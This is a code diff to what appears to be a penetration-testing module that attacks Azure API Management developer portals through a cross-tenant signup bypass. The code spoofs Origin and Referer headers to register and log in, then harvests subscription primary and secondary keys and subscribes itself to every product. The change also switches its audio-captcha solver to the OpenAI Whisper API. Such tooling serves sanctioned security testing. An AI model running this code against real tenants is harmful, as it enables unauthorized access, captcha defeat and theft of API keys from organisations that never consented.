@@ -11,11 +11,12 @@ import (
 	"log/slog"
 	"maps"
 	"net/http"
+	"context"
 	"os"
-	"os/exec"
-	"path/filepath"
 	"strings"
 	"time"
+
+	openai "github.com/sashabaranov/go-openai"
 
 	"github.com/praetorian-inc/aurelian/pkg/model"
 	"github.com/praetorian-inc/aurelian/pkg/output"
@@ -143,12 +144,11 @@ func (m *APIMCrossTenantModule) enumPublic(client *http.Client, target, mgmtURL,
 		{"products", "Microsoft.ApiManagement/service/products"},
 	} {
 		url := fmt.Sprintf("%s/%s?api-version=%s", mgmtURL, res.path, mgmtVersion)
-		var resp apimListResponse
-		if err := m.doJSON(client, http.MethodGet, url, nil, nil, &resp); err != nil {
+		items, err := m.doJSONList(client, url, nil)
+		if err != nil {
 			slog.Warn("pre-auth enumeration failed", "resource", res.path, "error", err)
-			continue
 		}
-		for _, item := range resp.Value {
+		for _, item := range items {
 			props := item.Properties
 			r := output.NewAzureResource("", res.resourceType, item.ID)
 			r.DisplayName = stringOrEmpty(props["displayName"])
@@ -165,11 +165,14 @@ func (m *APIMCrossTenantModule) enumPublic(client *http.Client, target, mgmtURL,
 	// Delegation settings exposure check.
 	delegURL := fmt.Sprintf("%s/portalsettings/delegation?api-version=%s", mgmtURL, mgmtVersion)
 	var delegResp struct {
-		Properties map[string]any `json:"properties"`
+		Properties struct {
+			Subscriptions    struct{ Enabled bool `json:"enabled"` } `json:"subscriptions"`
+			UserRegistration struct{ Enabled bool `json:"enabled"` } `json:"userRegistration"`
+		} `json:"properties"`
 	}
 	if err := m.doJSON(client, http.MethodGet, delegURL, nil, nil, &delegResp); err != nil {
 		slog.Warn("delegation settings check failed", "error", err)
-	} else if len(delegResp.Properties) > 0 {
+	} else if delegResp.Properties.Subscriptions.Enabled || delegResp.Properties.UserRegistration.Enabled {
 		ctx, _ := json.Marshal(delegResp.Properties)
 		out.Send(output.AurelianRisk{
 			Name:               "apim-delegation-settings-exposed",
@@ -218,8 +221,7 @@ func (m *APIMCrossTenantModule) bypassAndEnumAuthenticated(cfg plugin.Config, cl
 		"Origin":       attacker,
 		"Referer":      attacker + "/signup",
 	}
-	var signupResp any
-	if err := m.doJSON(client, http.MethodPost, target+"/signup", signupPayload, signupHeaders, &signupResp); err != nil {
+	if err := m.doJSON(client, http.MethodPost, target+"/signup", signupPayload, signupHeaders, nil); err != nil {
 		return fmt.Errorf("signup request failed: %w", err)
 	}
 
@@ -237,11 +239,17 @@ func (m *APIMCrossTenantModule) bypassAndEnumAuthenticated(cfg plugin.Config, cl
 
 	cfg.Success("login successful — user ID: %s", userID)
 
+	bypassCtx, _ := json.Marshal(map[string]string{
+		"target":  target,
+		"user_id": userID,
+		"email":   m.Email,
+	})
 	out.Send(output.AurelianRisk{
 		Name:               "apim-cross-tenant-signup-bypass",
 		Severity:           output.RiskSeverityHigh,
 		ImpactedResourceID: target,
 		DeduplicationID:    target,
+		Context:            bypassCtx,
 	})
 
 	authHeaders := map[string]string{
@@ -291,96 +299,92 @@ func (m *APIMCrossTenantModule) login(client *http.Client, target, mgmtVersion s
 // enumAuthenticated enumerates APIM resources using the SAS token.
 func (m *APIMCrossTenantModule) enumAuthenticated(client *http.Client, target, mgmtURL, mgmtVersion, userID string, headers map[string]string, out *pipeline.P[model.AurelianModel]) {
 	// APIs with operations.
-	var apiList apimListResponse
 	apiURL := fmt.Sprintf("%s/apis?api-version=%s", mgmtURL, mgmtVersion)
-	if err := m.doJSON(client, http.MethodGet, apiURL, nil, headers, &apiList); err != nil {
+	apiList, err := m.doJSONList(client, apiURL, headers)
+	if err != nil {
 		slog.Warn("authenticated API enumeration failed", "error", err)
-	} else {
-		for _, item := range apiList.Value {
-			props := item.Properties
-			r := output.NewAzureResource("", "Microsoft.ApiManagement/service/apis", item.ID)
-			r.DisplayName = stringOrEmpty(props["displayName"])
-			r.Properties = map[string]any{
-				"path":                 props["path"],
-				"description":          props["description"],
-				"subscriptionRequired": props["subscriptionRequired"],
-				"serviceUrl":           props["serviceUrl"],
-				"apiRevision":          props["apiRevision"],
-			}
-			// Fetch operations for this API.
-			ops := m.fetchOperations(client, mgmtURL, mgmtVersion, item.Name, headers)
-			if len(ops) > 0 {
-				r.Properties["operations"] = ops
-			}
-			out.Send(r)
+	}
+	for _, item := range apiList {
+		props := item.Properties
+		r := output.NewAzureResource("", "Microsoft.ApiManagement/service/apis", item.ID)
+		r.DisplayName = stringOrEmpty(props["displayName"])
+		r.Properties = map[string]any{
+			"path":                 props["path"],
+			"description":          props["description"],
+			"subscriptionRequired": props["subscriptionRequired"],
+			"serviceUrl":           props["serviceUrl"],
+			"apiRevision":          props["apiRevision"],
 		}
+		// Fetch operations for this API.
+		ops := m.fetchOperations(client, mgmtURL, mgmtVersion, item.Name, headers)
+		if len(ops) > 0 {
+			r.Properties["operations"] = ops
+		}
+		out.Send(r)
 	}
 
 	// Products.
-	var productList apimListResponse
 	productURL := fmt.Sprintf("%s/products?api-version=%s", mgmtURL, mgmtVersion)
-	if err := m.doJSON(client, http.MethodGet, productURL, nil, headers, &productList); err != nil {
+	productList, err := m.doJSONList(client, productURL, headers)
+	if err != nil {
 		slog.Warn("authenticated product enumeration failed", "error", err)
-	} else {
-		for _, item := range productList.Value {
-			props := item.Properties
-			r := output.NewAzureResource("", "Microsoft.ApiManagement/service/products", item.ID)
-			r.DisplayName = stringOrEmpty(props["displayName"])
-			r.Properties = map[string]any{
-				"state":            props["state"],
-				"approvalRequired": props["approvalRequired"],
-				"subscriptionRequired": props["subscriptionRequired"],
-			}
-			out.Send(r)
+	}
+	for _, item := range productList {
+		props := item.Properties
+		r := output.NewAzureResource("", "Microsoft.ApiManagement/service/products", item.ID)
+		r.DisplayName = stringOrEmpty(props["displayName"])
+		r.Properties = map[string]any{
+			"state":            props["state"],
+			"approvalRequired": props["approvalRequired"],
+			"subscriptionRequired": props["subscriptionRequired"],
 		}
+		out.Send(r)
 	}
 
 	// Existing subscriptions with keys.
-	var subList apimListResponse
 	subURL := fmt.Sprintf("%s/subscriptions?api-version=%s", mgmtURL, mgmtVersion)
-	if err := m.doJSON(client, http.MethodGet, subURL, nil, headers, &subList); err != nil {
+	subList, err := m.doJSONList(client, subURL, headers)
+	if err != nil {
 		slog.Warn("subscription enumeration failed", "error", err)
-	} else {
-		for _, item := range subList.Value {
-			props := item.Properties
-			primaryKey := stringOrEmpty(props["primaryKey"])
-			secondaryKey := stringOrEmpty(props["secondaryKey"])
-			if primaryKey == "" && secondaryKey == "" {
-				continue
-			}
-			ctx, _ := json.Marshal(map[string]string{
-				"subscription_name": item.Name,
-				"primary_key":       primaryKey,
-				"secondary_key":     secondaryKey,
-				"scope":             stringOrEmpty(props["scope"]),
-			})
-			out.Send(output.AurelianRisk{
-				Name:               "apim-exposed-subscription-key",
-				Severity:           output.RiskSeverityCritical,
-				ImpactedResourceID: target,
-				DeduplicationID:    target + "/" + item.Name,
-				Context:            ctx,
-			})
+	}
+	for _, item := range subList {
+		props := item.Properties
+		primaryKey := stringOrEmpty(props["primaryKey"])
+		secondaryKey := stringOrEmpty(props["secondaryKey"])
+		if primaryKey == "" && secondaryKey == "" {
+			continue
 		}
+		ctx, _ := json.Marshal(map[string]string{
+			"subscription_name": item.Name,
+			"primary_key":       primaryKey,
+			"secondary_key":     secondaryKey,
+			"scope":             stringOrEmpty(props["scope"]),
+		})
+		out.Send(output.AurelianRisk{
+			Name:               "apim-exposed-subscription-key",
+			Severity:           output.RiskSeverityCritical,
+			ImpactedResourceID: target,
+			DeduplicationID:    target + "/" + item.Name,
+			Context:            ctx,
+		})
 	}
 
 	// Groups.
-	var groupList apimListResponse
 	groupURL := fmt.Sprintf("%s/groups?api-version=%s", mgmtURL, mgmtVersion)
-	if err := m.doJSON(client, http.MethodGet, groupURL, nil, headers, &groupList); err != nil {
+	groupList, err := m.doJSONList(client, groupURL, headers)
+	if err != nil {
 		slog.Warn("group enumeration failed", "error", err)
-	} else {
-		for _, item := range groupList.Value {
-			props := item.Properties
-			r := output.NewAzureResource("", "Microsoft.ApiManagement/service/groups", item.ID)
-			r.DisplayName = stringOrEmpty(props["displayName"])
-			r.Properties = map[string]any{
-				"type":        props["type"],
-				"builtIn":     props["builtIn"],
-				"description": props["description"],
-			}
-			out.Send(r)
+	}
+	for _, item := range groupList {
+		props := item.Properties
+		r := output.NewAzureResource("", "Microsoft.ApiManagement/service/groups", item.ID)
+		r.DisplayName = stringOrEmpty(props["displayName"])
+		r.Properties = map[string]any{
+			"type":        props["type"],
+			"builtIn":     props["builtIn"],
+			"description": props["description"],
 		}
+		out.Send(r)
 	}
 
 	// Attempt to subscribe to all products.
@@ -392,13 +396,12 @@ func (m *APIMCrossTenantModule) enumAuthenticated(client *http.Client, target, m
 // fetchOperations retrieves HTTP operations for a single API.
 func (m *APIMCrossTenantModule) fetchOperations(client *http.Client, mgmtURL, mgmtVersion, apiName string, headers map[string]string) []map[string]any {
 	url := fmt.Sprintf("%s/apis/%s/operations?api-version=%s", mgmtURL, apiName, mgmtVersion)
-	var resp apimListResponse
-	if err := m.doJSON(client, http.MethodGet, url, nil, headers, &resp); err != nil {
+	items, err := m.doJSONList(client, url, headers)
+	if err != nil {
 		slog.Warn("operation enumeration failed", "api", apiName, "error", err)
-		return nil
 	}
-	ops := make([]map[string]any, 0, len(resp.Value))
-	for _, item := range resp.Value {
+	ops := make([]map[string]any, 0, len(items))
+	for _, item := range items {
 		ops = append(ops, map[string]any{
 			"name":        item.Name,
 			"method":      item.Properties["method"],
@@ -411,19 +414,21 @@ func (m *APIMCrossTenantModule) fetchOperations(client *http.Client, mgmtURL, mg
 
 // trySubscribeAll attempts to subscribe the authenticated user to every product.
 func (m *APIMCrossTenantModule) trySubscribeAll(client *http.Client, mgmtURL, mgmtVersion, userID, target string, headers map[string]string, out *pipeline.P[model.AurelianModel]) {
-	var productList apimListResponse
 	productURL := fmt.Sprintf("%s/products?api-version=%s", mgmtURL, mgmtVersion)
-	if err := m.doJSON(client, http.MethodGet, productURL, nil, headers, &productList); err != nil {
+	productList, err := m.doJSONList(client, productURL, headers)
+	if err != nil {
 		slog.Warn("product list for subscription failed", "error", err)
-		return
 	}
 
-	for _, product := range productList.Value {
+	for _, product := range productList {
 		productID := product.Name
 		if productID == "" {
-			// Fall back to last segment of ID.
 			parts := strings.Split(product.ID, "/")
 			productID = parts[len(parts)-1]
+		}
+		if productID == "" {
+			slog.Warn("skipping product with empty ID", "product_id", product.ID)
+			continue
 		}
 		subName := "poc-" + productID
 		scope := fmt.Sprintf("%s/products/%s", mgmtURL, productID)
@@ -518,9 +523,14 @@ func (m *APIMCrossTenantModule) solveCaptcha(cfg plugin.Config, client *http.Cli
 	return strings.TrimSpace(line), captcha, "visual", nil
 }
 
-// solveCaptchaAudio fetches an audio captcha and transcribes it via the `whisper` CLI.
-// Returns an error if the whisper CLI is not installed or transcription fails.
+// solveCaptchaAudio fetches an audio captcha and transcribes it via the OpenAI Whisper API.
+// Returns an error if OPENAI_API_KEY is not set or transcription fails.
 func (m *APIMCrossTenantModule) solveCaptchaAudio(client *http.Client, attacker string) (solution string, captcha apimCaptchaResponse, err error) {
+	apiKey := os.Getenv("OPENAI_API_KEY")
+	if apiKey == "" {
+		return "", captcha, fmt.Errorf("OPENAI_API_KEY not set")
+	}
+
 	captchaURL := fmt.Sprintf("%s/captcha-challenge?challengeType=audio", attacker)
 	if err := m.doJSON(client, http.MethodGet, captchaURL, nil, map[string]string{"Origin": attacker}, &captcha); err != nil {
 		return "", captcha, fmt.Errorf("fetching audio captcha: %w", err)
@@ -535,8 +545,7 @@ func (m *APIMCrossTenantModule) solveCaptchaAudio(client *http.Client, attacker 
 	if err != nil {
 		return "", captcha, fmt.Errorf("creating audio temp file: %w", err)
 	}
-	audioPath := tmpAudio.Name()
-	defer os.Remove(audioPath)
+	defer os.Remove(tmpAudio.Name())
 
 	if _, err := tmpAudio.Write(audioBytes); err != nil {
 		tmpAudio.Close()
@@ -544,25 +553,19 @@ func (m *APIMCrossTenantModule) solveCaptchaAudio(client *http.Client, attacker 
 	}
 	tmpAudio.Close()
 
-	outDir, err := os.MkdirTemp("", "apim-whisper-*")
+	transcribeCtx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+	oc := openai.NewClient(apiKey)
+	resp, err := oc.CreateTranscription(transcribeCtx, openai.AudioRequest{
+		Model:    openai.Whisper1,
+		FilePath: tmpAudio.Name(),
+		Language: "en",
+	})
 	if err != nil {
-		return "", captcha, fmt.Errorf("creating whisper output dir: %w", err)
-	}
-	defer os.RemoveAll(outDir)
-
-	cmd := exec.Command("whisper", audioPath, "--model", "tiny", "--output_format", "txt", "--output_dir", outDir)
-	if out, cmdErr := cmd.CombinedOutput(); cmdErr != nil {
-		return "", captcha, fmt.Errorf("whisper CLI: %w (output: %s)", cmdErr, strings.TrimSpace(string(out)))
+		return "", captcha, fmt.Errorf("whisper API transcription: %w", err)
 	}
 
-	base := strings.TrimSuffix(filepath.Base(audioPath), ".mp3")
-	txtPath := filepath.Join(outDir, base+".txt")
-	text, err := os.ReadFile(txtPath)
-	if err != nil {
-		return "", captcha, fmt.Errorf("reading whisper output: %w", err)
-	}
-
-	return strings.TrimSpace(string(text)), captcha, nil
+	return strings.TrimSpace(resp.Text), captcha, nil
 }
 
 // fetchConfig retrieves the APIM portal config.json and returns the management API URL and version.
@@ -629,6 +632,21 @@ func (m *APIMCrossTenantModule) doJSON(client *http.Client, method, url string, 
 	return nil
 }
 
+// doJSONList fetches all pages of a paginated APIM list endpoint.
+func (m *APIMCrossTenantModule) doJSONList(client *http.Client, firstURL string, headers map[string]string) ([]apimItem, error) {
+	var all []apimItem
+	next := firstURL
+	for next != "" {
+		var resp apimListResponse
+		if err := m.doJSON(client, http.MethodGet, next, nil, headers, &resp); err != nil {
+			return all, err
+		}
+		all = append(all, resp.Value...)
+		next = resp.NextLink
+	}
+	return all, nil
+}
+
 // buildHTTPClient creates an HTTP client that honors the Insecure flag.
 func (m *APIMCrossTenantModule) buildHTTPClient() *http.Client {
 	transport := http.DefaultTransport.(*http.Transport).Clone()
@@ -661,7 +679,8 @@ func stringOrEmpty(v any) string {
 
 // apimListResponse is the common envelope for paginated APIM management API responses.
 type apimListResponse struct {
-	Value []apimItem `json:"value"`
+	Value    []apimItem `json:"value"`
+	NextLink string     `json:"nextLink,omitempty"`
 }
 
 type apimItem struct {
